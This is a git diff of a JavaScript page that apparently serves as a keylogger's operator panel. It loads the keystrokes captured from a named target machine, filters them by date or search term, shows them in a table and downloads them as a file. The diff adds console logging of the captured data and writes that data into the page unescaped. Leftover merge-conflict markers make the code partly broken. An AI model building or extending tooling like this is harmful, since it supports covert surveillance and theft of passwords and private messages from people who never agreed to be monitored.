@@ -1,23 +1,32 @@
+// Event listener for the machine page
 document.addEventListener('DOMContentLoaded', function () {
-    // Get URL parameters
+    /**
+     * Extracts the target machine from the URL parameters and sets the machine name in the DOM.
+     * Displays a loading message while fetching keystrokes.
+     * Adds event listeners for filtering, clearing, and downloading keystrokes.
+     */
     const urlParams = new URLSearchParams(window.location.search);
     const targetMachine = urlParams.get('machine');
     document.getElementById('machineName').textContent = targetMachine;
 
     const keystrokesOutput = document.getElementById('keystrokesOutput');
-    keystrokesOutput.innerHTML = '<div class="text-center p-4">Loading...</div>';
+    keystrokesOutput.innerHTML = 'Loading...';
 
-    // Initial load of keystrokes
+    // Fetch and display keystrokes initially
     getKeystrokes(targetMachine).then(displayKeystrokes);
 
-    // Filter button click event
+    // Add event listener for filtering keystrokes
     document.getElementById('filterButton').addEventListener('click', function () {
+        /**
+         * Filters keystrokes based on the selected start and end dates.
+         * Displays the filtered keystrokes.
+         */
         const startDate = document.getElementById('startDate').value;
         const endDate = document.getElementById('endDate').value;
 
         getKeystrokes(targetMachine).then(function (keystrokes) {
             if (!Array.isArray(keystrokes)) {
-                keystrokesOutput.innerHTML = '<div class="text-center p-4">Error fetching data</div>';
+                keystrokesOutput.textContent = 'Error fetching data';
                 return;
             }
             const filteredKeystrokes = filterKeystrokesByDate(keystrokes, startDate, endDate);
@@ -25,43 +34,40 @@ document.addEventListener('DOMContentLoaded', function () {
         });
     });
 
-    // Clear button click event
+    // Add event listener for clearing filters
     document.getElementById('clearButton').addEventListener('click', function () {
+        /**
+         * Clears the date filters and displays all keystrokes.
+         */
         document.getElementById('startDate').value = '';
         document.getElementById('endDate').value = '';
-        document.getElementById('searchTerm').value = '';
         getKeystrokes(targetMachine).then(displayKeystrokes);
     });
 
-    // Download button click event
+    // Add event listener for downloading keystrokes
     document.getElementById('downloadButton').addEventListener('click', function () {
+        /**
+         * Downloads the filtered keystrokes as a text file.
+         */
         const startDate = document.getElementById('startDate').value;
         const endDate = document.getElementById('endDate').value;
-        const searchTerm = document.getElementById('searchTerm').value.toLowerCase();
 
         getKeystrokes(targetMachine).then(function (keystrokes) {
             if (!Array.isArray(keystrokes)) {
-                console.error('Error fetching keystrokes for download');
+                keystrokesOutput.textContent = 'Error fetching data';
                 return;
             }
-            let filteredKeystrokes = keystrokes;
-            if (startDate || endDate) {
-                filteredKeystrokes = filterKeystrokesByDate(filteredKeystrokes, startDate, endDate);
-            }
-            if (searchTerm) {
-                filteredKeystrokes = filterKeystrokesBySearchTerm(filteredKeystrokes, searchTerm);
-            }
-            console.log('filteredKeystrokes', filteredKeystrokes);
+            const filteredKeystrokes = filterKeystrokesByDate(keystrokes, startDate, endDate);
             downloadKeystrokes(filteredKeystrokes);
         });
     });
 
-    // Search input event
+    // Add event listener for searching keystrokes
     document.getElementById('searchTerm').addEventListener('input', function () {
-        const searchTerm = this.value.toLowerCase();
+        const searchTerm = document.getElementById('searchTerm').value.toLowerCase();
         getKeystrokes(targetMachine).then(function (keystrokes) {
             if (!Array.isArray(keystrokes)) {
-                keystrokesOutput.innerHTML = '<div class="text-center p-4">Error fetching data</div>';
+                keystrokesOutput.textContent = 'Error fetching data';
                 return;
             }
             const filteredKeystrokes = filterKeystrokesBySearchTerm(keystrokes, searchTerm);
@@ -71,8 +77,9 @@ document.addEventListener('DOMContentLoaded', function () {
 });
 
 /**
- * Fetches keystrokes for the specified target machine.
- * @param {string} targetMachine - The target machine identifier.
+ * Fetches keystrokes from the backend for the specified machine.
+ *
+ * @param {string} targetMachine - The name of the target machine.
  * @returns {Promise<Array>} A promise that resolves to an array of keystrokes.
  */
 function getKeystrokes(targetMachine) {
@@ -91,16 +98,20 @@ function getKeystrokes(targetMachine) {
 }
 
 /**
- * Filters keystrokes by date range.
- * @param {Array} keystrokes - The array of keystrokes.
- * @param {string} startDate - The start date in YYYY-MM-DD format.
- * @param {string} endDate - The end date in YYYY-MM-DD format.
+ * Filters keystrokes by the specified date range.
+ *
+ * @param {Array} keystrokes - The array of keystrokes to filter.
+ * @param {string} startDate - The start date for filtering.
+ * @param {string} endDate - The end date for filtering.
  * @returns {Array} The filtered array of keystrokes.
  */
 function filterKeystrokesByDate(keystrokes, startDate, endDate) {
     if (!Array.isArray(keystrokes)) return [];
     const start = startDate ? new Date(startDate + 'T00:00:00') : null;
     const end = endDate ? new Date(endDate + 'T23:59:59') : null;
+    console.log('start', start);
+    console.log('end', end);
+    console.log('keystrokes', keystrokes);
 
     return keystrokes.filter(entry => {
         const timestamp = new Date(entry.timestamp);
@@ -109,54 +120,40 @@ function filterKeystrokesByDate(keystrokes, startDate, endDate) {
 }
 
 /**
- * Displays keystrokes in a table format.
- * @param {Array} keystrokes - The array of keystrokes.
+ * Displays the keystrokes in a table format.
+ *
+ * @param {Array} keystrokes - The array of keystrokes to display.
  */
 function displayKeystrokes(keystrokes) {
     const keystrokesOutput = document.getElementById('keystrokesOutput');
     keystrokesOutput.innerHTML = '';
 
     if (!keystrokes || keystrokes.length === 0) {
-        keystrokesOutput.innerHTML = '<div class="text-center p-4">No data available</div>';
+        keystrokesOutput.textContent = 'No data available';
         return;
     }
 
     const table = document.createElement('table');
-    table.className = 'table table-hover';
+    const headerRow = document.createElement('tr');
+    headerRow.innerHTML = '<th>Timestamp</th><th>Data</th>';
+    table.appendChild(headerRow);
 
-    const thead = document.createElement('thead');
-    thead.innerHTML = `
-        <tr>
-            <th><i class="fas fa-clock me-2"></i>Timestamp</th>
-            <th><i class="fas fa-keyboard me-2"></i>Data</th>
-        </tr>
-    `;
-    table.appendChild(thead);
-
-    const tbody = document.createElement('tbody');
     keystrokes.forEach(entry => {
         const row = document.createElement('tr');
-        const timestamp = new Date(entry.timestamp).toLocaleString();
-        row.innerHTML = `
-            <td>${timestamp}</td>
-            <td><code>${entry.data}</code></td>
-        `;
-        tbody.appendChild(row);
+        row.innerHTML = `<td>${entry.timestamp}</td><td>${entry.data}</td>`;
+        table.appendChild(row);
     });
 
-    table.appendChild(tbody);
     keystrokesOutput.appendChild(table);
 }
 
 /**
  * Downloads the keystrokes as a text file.
- * @param {Array} keystrokes - The array of keystrokes.
+ *
+ * @param {Array} keystrokes - The array of keystrokes to download.
  */
 function downloadKeystrokes(keystrokes) {
-    const keystrokesText = keystrokes.map(entry =>
-        `${new Date(entry.timestamp).toLocaleString()} - ${entry.data}`
-    ).join('\n');
-
+    const keystrokesText = keystrokes.map(entry => `${entry.timestamp} ${entry.data}`).join('\n');
     const blob = new Blob([keystrokesText], {type: 'text/plain'});
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
@@ -167,21 +164,14 @@ function downloadKeystrokes(keystrokes) {
 }
 
 /**
- * Filters keystrokes by search term.
- * @param {Array} keystrokes - The array of keystrokes.
- * @param {string} searchTerm - The search term.
+ * Filters keystrokes by the specified search term.
+ *
+ * @param {Array} keystrokes - The array of keystrokes to filter.
+ * @param {string} searchTerm - The search term to filter by.
  * @returns {Array} The filtered array of keystrokes.
  */
 function filterKeystrokesBySearchTerm(keystrokes, searchTerm) {
     if (!Array.isArray(keystrokes)) return [];
-<<<<<<< HEAD
     return keystrokes.filter(entry => entry.data.toLowerCase().includes(searchTerm));
 }
 
-=======
-    return keystrokes.filter(entry =>
-        entry.data.toLowerCase().includes(searchTerm) ||
-        entry.timestamp.toLowerCase().includes(searchTerm)
-    );
-}
->>>>>>> b972b20065a5246d9f74f3d3e80e687f97b3881e
